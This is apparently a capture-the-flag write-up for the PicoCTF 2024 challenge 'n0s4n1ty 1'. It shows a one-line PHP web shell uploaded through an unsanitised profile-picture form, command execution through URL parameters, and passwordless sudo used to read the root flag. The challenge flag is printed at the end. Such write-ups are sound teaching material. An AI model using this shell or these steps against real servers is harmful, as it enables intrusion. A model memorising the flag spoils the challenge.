# **Write-Up: n0s4n1ty 1 (PicoCTF 2024)**  

## **Challenge Overview**  

In this challenge, a developer has implemented a **profile picture upload** feature on a website. However, the file upload mechanism is not properly secured, allowing for **arbitrary file uploads**. This presents an opportunity to upload a **malicious PHP script**, execute system commands, and ultimately retrieve the flag located in the `/root` directory.  

---

## **Hints and Initial Analysis**  

The challenge provides two key hints:  

1. **"File upload was not sanitized."**  
   - This suggests that the system does not properly validate uploaded files, meaning it might allow **arbitrary file execution**.  

2. **"Whenever you get a shell on a remote machine, check `sudo -l`."**  
   - This implies that **privilege escalation** might be possible once access to the system is obtained.  

---

## **Step 1: Exploring the Web Application**  

### **1. Accessing the Website**  
The challenge provides a URL:  

```
http://standard-pizzas.picoctf.net:51555/
```

Upon opening the page, a **profile picture upload** feature is available. This is a common place where **file upload vulnerabilities** are introduced if proper security measures are not in place.  

### **2. Testing File Upload Restrictions**  
To assess how the system handles uploads, a standard `.jpg` image was uploaded. Observing the response, it became clear that the system **stored the uploaded files without modifying their names**—an indication that an **arbitrary file upload attack** might work.  

---

## **Step 2: Exploiting the File Upload Vulnerability**  

Since the system does not properly validate uploads, a **malicious PHP web shell** can be uploaded to gain control over the server.  

### **1. Creating a Malicious Web Shell**  

A simple PHP shell script was created:  

```php
<?php system($_GET['cmd']); ?>
```

- This script takes an input parameter (`cmd`) from the URL and executes it as a system command.
- If executed successfully, commands such as `ls` or `whoami` can be run remotely.  

### **2. Uploading the Web Shell**  

The file (`shell.php`) was uploaded using the profile picture upload form.  

After uploading, the next step was to find the exact URL where the file was stored. Based on common upload directories, a few potential paths were tested:  

```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php
http://standard-pizzas.picoctf.net:51555/images/shell.php
http://standard-pizzas.picoctf.net:51555/profile_pics/shell.php
```

After some testing, the correct path was identified, confirming that **the uploaded PHP shell was executable**.

---

## **Step 3: Remote Command Execution (RCE)**  

With the PHP shell in place, arbitrary system commands could be executed by appending them as parameters in the URL.  

### **1. Verifying Access to the Server**  
Executing the following command to list files in the current directory:  

```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=ls
```

**Expected Output:**
```
1619046.png  shell.php
```

This confirmed **successful remote command execution (RCE)**.

### **2. Checking User Privileges**  
To determine the current user, the following command was executed:  

```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=id
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell was running as **`www-data`**, a low-privilege web server user.

### **3. Checking for Sudo Permissions**  
Following the challenge hint, the next step was to check for **sudo permissions**:  

```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=sudo%20-l
```

**Output:**
```
User www-data may run the following commands:
    (ALL) NOPASSWD: ALL
```

This confirmed that **the `www-data` user had unrestricted sudo access**, meaning **full root control** could be obtained.

---

## **Step 4: Privilege Escalation and Retrieving the Flag**  

### **1. Switching to Root**  
Since the `www-data` user could execute any command as root **without a password**, it was possible to escalate privileges instantly:  

```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=sudo%20whoami
```

**Output:**
```
root
```

This confirmed **root access**.

### **2. Reading the Flag File**  
Since the flag was stored in `/root/flag.txt`, the following command was executed:  

```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt
```

**Flag Output:**
```
picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}
```

This successfully retrieved the flag, completing the challenge.

---
